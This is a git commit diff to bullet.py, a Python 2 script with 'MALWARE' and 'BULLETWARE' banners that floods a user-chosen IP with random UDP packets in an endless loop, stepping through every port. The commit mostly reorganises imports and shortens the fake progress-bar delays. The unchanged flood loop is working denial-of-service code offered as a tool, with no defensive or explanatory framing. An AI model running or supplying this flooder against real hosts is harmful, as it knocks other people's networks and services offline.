17b16daf98d608536cf1927c2bff64d5e5ac267b
Grim Hacker 555 <51239639+Grim-Hacker-555@users.noreply.github.com>
2020-02-25 10:26:10 +0700

    Update bullet.py

--- bullet.py
+++ bullet.py
@@ -1,11 +1,8 @@
-import os,sys
+import os,sys,time,socket,random
+from time import sleep as sl
+from os import system as sy
+sy ("figlet MALWARE | lolcat ")
 
-os.system ("figlet MALWARE | lolcat ")
-import sys
-import os
-import time
-import socket
-import random
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -15,35 +12,34 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+#############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
-os.system("figlet BULLETWARE | lolcat ")
+sy("clear")
+sy("figlet BULLETWARE | lolcat ")
 print
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
-
-os.system("clear")
-os.system("figlet SHOOT ! ! | lolcat")
-print "[                     ] 0% "
-time.sleep(3)
-print "[=====>               ] 25%"
-time.sleep(3)
-print "[==========>          ] 50%"
-time.sleep(3)
-print "[===============>     ] 75%"
-time.sleep(3)
+sy("clear")
+sy("figlet SHOOT ! ! | lolcat")
+print "[                     ] 000% "
+sl(1)
+print "[=====>               ] 025%"
+sl(1)
+print "[==========>          ] 050%"
+sl(1)
+print "[===============>     ] 075%"
+sl(1)
 print "[====================>] 100%"
-time.sleep(3)
+sl(0.5)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     sent += 1
+     port += 1
+     print "Sent %s ip: %s port:%s"%(sent,ip,port)
      if port == 65534:
-       port = 1
+        port = 1
